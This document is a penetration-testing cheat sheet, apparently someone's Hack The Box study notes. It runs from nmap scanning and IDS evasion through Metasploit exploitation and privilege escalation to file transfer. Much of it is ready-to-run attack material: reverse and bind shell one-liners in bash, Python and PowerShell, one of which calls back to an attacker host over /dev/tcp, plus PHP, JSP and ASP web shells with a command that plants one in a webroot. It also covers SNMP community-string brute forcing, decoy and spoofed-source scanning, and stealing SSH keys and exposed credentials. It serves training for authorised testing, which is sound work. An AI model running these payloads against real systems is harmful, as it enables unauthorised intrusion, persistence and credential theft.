# Fingerprinting services
    1. Banner grabbing
        a. manual
        b. sudo nmap -sV --script=banner -oA file_name <target>
    2. Nmap 
        a. Host discovery - when we deal we a range of networks - identify running hosts to prevent scanning of dead hosts. - https://nmap.org/book/host-discovery-strategies.html
            - sudo nmap 10.129.2.18 -sn -oA host # determine if the host is alive or not
            - sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace # before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the "--packet-trace" option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this.
            - sudo nmap 10.129.2.18 -sn -oA host -PE --reason # Another way to determine why Nmap has our target marked as "alive" is with the "--reason" option.
            - sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping # disable ARP requests and scan our target with the desired ICMP echo requests
            - sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5  # ICMP echo requests scan.
            - sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5  # Scan IP List - ICMP echo requests scan 
            !Note: We can identify the running OS from an ICMP echo reply by checkting the TTL value. a default value of 64 is common for Linux/Unix, a value of 128 for Windows XP/7/8/2003/2008, a value of 32 for Windows 95/98/ME.
        b. Port discovery
            - sudo nmap -oA file_name <target> # first run on common ports
            - sudo nmap -p- -oA file_name <target> # second run on all ports
            - sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping # to inspect the scan, we enable packet-trace and disable the ICMP echo requests (-Pn), DNS resolution (-n), and ARP ping scan (--disable-arp-ping).
            - sudo nmap 10.129.2.28 -oA file_name -F -sU # Discovering Open UDP Ports -F scans fewer of the default common ports
            - sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason # If the UDP port is open, we only get a response if the application is configured to do so. If we get an ICMP response with error code 3 (port unreachable), we know that the port is indeed closed. For all other ICMP responses, the scanned ports are marked as (open|filtered).
            - sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason  -sV # This method can identify versions, service names, and details about our target.
                State	Description
                open	This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.
                closed	When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.
                filtered	Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
                unfiltered	This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.
                open|filtered	If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.
                closed|filtered This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.
        c. Service Enumeration - To view the scan status, press the [Space Bar] during the scan or use the option --stats-every=5s also you can use option -v, -vv, -vvv for diffferent levels of verbosity
            - sudo nmap -sV -sC -p<specific ports> -oA file_name <target> # run on found ports to be open, if run with this options on all ports it will take a long time
            !Note: Primarily, Nmap looks at the banners of the scanned ports and prints them out. If it cannot identify versions through the banners, Nmap attempts to identify them through a signature-based matching system, but this significantly increases the scan's duration. One disadvantage to Nmap's presented results is that the automatic scan can miss some information because sometimes Nmap does not know how to handle it. It is a good practice to packet-trace and check the results yourself.
            - sudo nmap 10.129.2.28 -p- -sV -Pn -n --disable-arp-ping --packet-trace
            !Very important !!!Note: after a successful three-way handshake, the server often sends a banner for identification. At the network level, this happens with a PSH flag in the TCP header. However, it can happen that some services do not immediately provide such information. It is also possible to remove or manipulate the banners from the respective services. If we manually connect to the SMTP server using nc, grab the banner, and intercept the network traffic using tcpdump, we can see what Nmap did not show us.
            - sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28
            - nc -nv 10.129.2.28 25
        d. Scripting Engine - Nmap Scripting Engine (NSE) is another handy feature of Nmap. It provides us with the possibility to create scripts in Lua for interaction with certain services.
            - sudo nmap <target> -sC # Default Scripts
            !Note: There are a total of 14 categories into which these scripts can be divided:
                Category	Description
                auth	Determination of authentication credentials.
                broadcast	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
                brute	Executes scripts that try to log in to the respective service by brute-forcing with credentials.
                default	Default scripts executed by using the -sC option.
                discovery	Evaluation of accessible services.
                dos	These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
                exploit	This category of scripts tries to exploit known vulnerabilities for the scanned port.
                external	Scripts that use external services for further processing.
                fuzzer	This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
                intrusive	Intrusive scripts that could negatively affect the target system.
                malware	Checks if some malware infects the target system.
                safe	Defensive scripts that do not perform intrusive and destructive access.
                version	Extension for service detection.
                vuln	Identification of specific vulnerabilities.
            - sudo nmap <target> --script <category> # Specific Scripts Category
            - sudo nmap <target> --script <script-name>,<script-name>,... # Defined Scripts - check /usr/share/nmap/scripts or with locate scripts/<service name> to find appropriate nmap scripts for specific services
            - sudo nmap --script smb-os-discovery.nse -p445 -oA file_name <target>
            - sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands
            - sudo nmap 10.129.2.28 -p 80 -A #  Aggressive Scan - This scans the target with multiple options as service detection (-sV), OS detection (-O), traceroute (--traceroute), and with the default NSE scripts (-sC).
            - sudo nmap 10.129.2.28 -p 80 -sV --script vuln # Vulnerability Assessment by using the scripts from vuln cathegory.
        e. Performance - Scanning performance plays a significant role when we need to scan an extensive network or are dealing with low network bandwidth. We can use various options to tell Nmap how fast (-T <1-5>), with which frequency (--min-parallelism <number>), which timeouts (--max-rtt-timeout <time>) the test packets should have, how many packets should be sent simultaneously (--min-rate <number>), and with the number of retries (--max-retries <number>) for the scanned ports the targets should be scanned.
            - Timeouts - When Nmap sends a packet, it takes some time (Round-Trip-Time - RTT) to receive a response from the scanned port. Generally, Nmap starts with a high timeout (--min-RTT-timeout) of 100ms.
                + sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms # setting the initial RTT timeout (--initial-rtt-timeout) to too short a time period may cause us to overlook hosts. Increasing might couse us to see more hosts if a host is slow to respond. But we can greatly increase the scan speed.
            - Max Retries (--max-retries) - default value for the retry rate is 10. 
                + sudo nmap 10.129.2.0/24 -F --max-retries 0 # accelerating can also have a negative effect on our results, which means we can overlook important information. 
            - Rates - During a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures. If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans with Nmap. When setting the minimum rate (--min-rate <number>) for sending packets, we tell Nmap to simultaneously send the specified number of packets. It will attempt to maintain the rate accordingly.
                + sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300 # puts a higher load on the network.
            - Timing - Because such settings cannot always be optimized manually, as in a black-box penetration test, Nmap offers six different timing templates (-T <0-5>) for us to use. These values (0-5) determine the aggressiveness of our scans. This can also have negative effects if the scan is too aggressive, and security systems may block us due to the produced network traffic. The default timing template used when we have defined nothing else is the normal (-T 3).
                -T 0 / -T paranoid
                -T 1 / -T sneaky
                -T 2 / -T polite
                -T 3 / -T normal
                -T 4 / -T aggressive
                -T 5 / -T insane
                + https://nmap.org/book/performance-timing-templates.html # here we can find the default options used for the Timings above.
        f. Filtered ports - Firewall and IDS/IPS Evasion - the fragmentation of packets, the use of decoys, and others
            - Determine Firewalls and Their Rules - The packets can either be dropped, or rejected. The dropped packets are ignored, and no response is returned from the host. This is different for rejected packets that are returned with an RST flag. These packets contain different types of ICMP error codes or contain nothing at all. Such errors can be:
                Net Unreachable
                Net Prohibited
                Host Unreachable
                Host Prohibited
                Port Unreachable
                Proto Unreachable
                + Nmap's TCP ACK scan (-sA) method is much harder to filter for firewalls and IDS/IPS systems than regular SYN (-sS) or Connect scans (sT) because they only send a TCP packet with only the ACK flag. When a port is closed or open, the host must respond with an RST flag. Unlike outgoing connections, all connection attempts (with the SYN flag) from external networks are usually blocked by firewalls. However, the packets with the ACK flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.
                + With the SYN scan (-sS) our target tries to establish the TCP connection by sending a packet back with the SYN-ACK (SA) flags set and with the ACK scan (-sA) we get the RST flag because TCP port 22 is open. For the TCP port 25, we do not receive any packets back, which indicates that the packets will be dropped.
            - Detect IDS/IPS - Several virtual private servers (VPS) with different IP addresses are recommended to determine whether such systems are on the target network during a penetration test.
                + One method to determine whether such IPS system is present in the target network is to scan from a single host (VPS). If at any time this host is blocked and has no access to the target network, we know that the administrator has taken some security measures. Accordingly, we can continue our penetration test with another VPS. Consequently, we know that we need to be quieter with our scans and, in the best case, disguise all interactions with the target network and its services.
            - Decoys(-D) - usefull in cases in which administrators block specific subnets from different regions or when IPS should block us. Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent.
                + sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 # generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. 
                !Note: decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms. The spoofed packets are often filtered out by ISPs and routers, even though they come from the same network range. Therefore, we can also specify our VPS servers' IP addresses and use them in combination with "IP ID" manipulation in the IP headers to scan the target.
                + sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0 # if only individual subnets do not have access to the server's specific services manually specify the source IP address (-S) to test if we get better results with this one.
                !Note: Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans.
            - DNS Proxying - DNS queries are passed in most cases because the given web server is supposed to be found and visited.
                + sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 #  we can use TCP port 53 as a source port (--source-port) for our scans.
                !Note: Nmap still gives us a way to specify DNS servers ourselves (--dns-server <ns>,<ns>). This method could be fundamental to us if we are in a demilitarized zone (DMZ). The company's DNS servers are usually more trusted than those from the Internet. We can use them to interact with the hosts of the internal network.
            - Connect To The Filtered Port
                + ncat -nv --source-port 53 10.129.2.28 50000 # Use the port that is able to send requests to a filtered port on the destination host.
    3. smbclient can be used to list shared folders in an smb service
        a. smbclient -N -L \\\\<targetIP>
        b. smbclient -U bob \\\\<tagetIP>\\<targetFolder>
    4. SNMP Community strings provide information and statistics about a router or device, helping us gain access to it
        a. snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
        b. snmpwalk -v 2c -c private  10.129.42.253 
        c. onesixtyone -c dict.txt 10.129.42.254 # https://github.com/trailofbits/onesixtyone # can be used to bruteforce community strings
# Exploiting services
## Public Exploits
    1. Google
    2. searchsploit - public vulnerabilities/exploits for any application
        - sudo apt install exploitdb -y
        - searchsploit openssh 7.2
    3. https://www.exploit-db.com/
    4. https://www.rapid7.com/db/
    5. https://www.vulnerability-lab.com/
## Metasploit Framework
    1. msfconsole
        a. search exploit <exploit name>
            - Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search
        b. use exploit/windows/smb/ms17_010_psexec
            - show options # to configure the options to run the exploit
        c. set RHOSTS 10.10.10.40
        d. set LHOST tun0
        e. check
            -  before we run the script, we can run a check to ensure the server is vulnerable. not every exploit supports the check function.
        f. exploit -  run or exploit command to run the exploit.
            - meterpreter > getuid
            - meterpreter > shell
            - C:\WINDOWS\system32>whoami
    ### Boxes to practice msfconsole on HTB (retired)
        Granny/Grandpa
        Jerry
        Blue
        Lame
        Optimum
        Legacy
        Devel
# Shells
    1. Linux
        a. SSH
    2. Windows
        a. WinRM
## Types of Shells
    1. Reverse Shell	Connects back to our system and gives us control through a reverse connection.
        a. Shell
            - nc -lvnp 1234 # on the attacking machine
            - bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' # Target Linux 
            - powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() # Target Windows
            - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md # check this for other shells.
            !Note: A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.
        b. Upgrading TTY 
            - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ # Upgrading Simple Shells to Fully Interactive TTYs
            - python/stty method 
                + python -c 'import pty; pty.spawn("/bin/bash")' # if we get a command not found error maybe the shell we have does not have the PATH env to the file (check with 'which')
                + ctrl + z # background our shell
                + stty raw -echo # input the following back on our local terminal
                + fg # bring back our netcat
                + [enter] x2 # or type reset then [enter] # after this or maybe a few more [enters] and we should have a fully working TTY
            - fix terminal size
                + echo $TERM # in our local terminal
                + stty size # in our local terminal
                + export TERM=xterm-256color # the variable may differ depending on the output of previous commands
                + stty rows 67 columns 318 # the variable may differ depending on the output of previous commands
    2. Bind Shell	    Waits for us to connect to it and gives us control once we do.
        a. Shell
            - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f # Target Linux
            - python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' # Target Linux using python
            - powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); # Target Windows
            - nc 10.10.10.1 1234 # Then we connect with netcat to the listening port
            !Note: As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
        b. Upgrading TTY
            - https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ # Upgrading Simple Shells to Fully Interactive TTYs
            - python/stty method 
                + python3 -c 'import pty; pty.spawn("/bin/bash")' # if we get a command not found error maybe the shell we have does not have the PATH env to the file (check with 'which')
                + ctrl + z # background our shell
                + stty raw -echo # input the following back on our local terminal
                + fg # bring back our netcat
                + [enter] x2 # or type reset then [enter] # after this or maybe a few more [enters] and we should have a fully working TTY
            - fix terminal size
                + echo $TERM # in our local terminal
                + stty size # in our local terminal
                + export TERM=xterm-256color # the variable may differ depending on the output of previous commands
                + stty rows 67 columns 318 # the variable may differ depending on the output of previous commands
    3. Web Shell	    Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
        a. Writing a Web Shell
            - <?php system($_REQUEST["cmd"]); ?> # PHP 
            - <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> # jsp
            - <% eval request("cmd") %> # asp
        b. Uploading a Web Shell
            - can be through a vulnerability in an upload feature
            -  if we only have remote command execution through an exploit
                + we can write our shell directly to the webroot to access it over the web
                + echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
        c. Accessing Web Shell
            - curl http://SERVER_IP:PORT/shell.php?cmd=id # pass the commands to the cmd variable defined in the web shell
            - http://SERVER_IP:PORT/shell.php?cmd=id # in browser pass the commands to the cmd variable defined in the web shell
            Pros:
                !Note: A great benefit of a web shell is that it would bypass any firewall restriction in place as it will not open a new connection
                !Note: Another great benefit is that if the compromised host is rebooted, the web shell would still be in place
            Cons:
                !Note: a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands
# Privilege Escalation
    find an internal/local vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows
## PrivEsc Checklists
    1. https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist # Linux
    2. https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation # Windows
    3. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md # Linux
    4. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md # Windows
## Enumeration Scripts
    1. Linux
        - https://github.com/rebootuser/LinEnum
        - https://github.com/sleventyeleven/linuxprivchecker
    2. Windwos
        - https://github.com/GhostPack/Seatbelt
        - https://github.com/411Hall/JAWS
    3. Both
        - https://github.com/carlospolop/PEASS-ng
    !Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
## Kernel Exploits
    - If an old version of kernel is running, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows. We can then use this to escalate our privileges.
## Vulnerable Software
    1. Check installed installed software that might be vulnerable.
        a. dpkg -l # Linux, deb based
        b. C:\Program Files # check this folder in windows
        c. Get-WmiObject -Class Win32_Product # Windows Powershell
## User Privileges
    1. common ways to exploit certain user privileges
        a. sudo # Linux
            - sudo -l # requires a password to run - there are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password.
                +  (user : user) NOPASSWD: /bin/echo # such an output shows that we can run /bin/echo without a password 
            - if a particular application can run with sudo, we can look for ways to exploit it to get a shell as the root user
                + https://gtfobins.github.io/ # contains a list of commands and how they can be exploited through sudo
                + https://lolbas-project.github.io/#  # contains a list of Windows applications which we may be able to leverage to perform certain functions
        b. SUID
        c. Windows Token Privileges
## Scheduled Tasks
    1. Add new scheduled tasks/cron jobs
        a. Linux directories where we can add cron jobs if we have the write permissions over them
            - /etc/crontab
            - /etc/cron.d
            - /var/spool/cron/crontabs/root
    2. Trick them to execute a malicious software
        a. we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
## Exposed Credentials
    1. look for files we can read and see if they contain any exposed credentials.
        a. configuration files
        b. log files
        c. history files
            - bash_history # linux
            - PSReadLine # Windows
        !Note: enumeration scripts previously mentioned above usually look for potential passwords in files and provide them to us
    2. If we find any credentials we should also check if they are reused somewhere.
## SSH Keys
    1. If we have read access over the .ssh directory for a specific user we may read their private ssh keys and use it to log in to the server
        a. check all users .ssh
        b. check root user .ssh
        c. copy private key and log in
            - ssh user@10.10.10.10 -i id_rsa
            !Note: use the command 'chmod 600 id_rsa' on the key after creation on your machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
    2. If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys.
    !Note: This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user.
# Transferring Files
    1. Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file
    2. wget/cURL
        a. running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host
            - python3 -m http.server 8000 # in the directory that contains the file we need
            - wget http://10.10.14.1:8000/linenum.sh # download the file on the remote
            - curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
    3. SCP # granted we have obtained ssh user credentials on the remote host
        a. scp linenum.sh user@remotehost:/tmp/linenum.sh
    4. Using Base64 # if we are not be able to transfer the file, for example, the remote host may have firewall protections that prevent us from downloading a file from our machine
        a. we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it
            - base64 shell -w 0 # encode a binary file called shell
            - echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell # decode a base64 string into a binary file called shell
        b. Validating File Transfers
            - file shell # To ensure that we did not mess up the file during the encoding/decoding process
            - md5sum shell # we can check its md5 hash as well
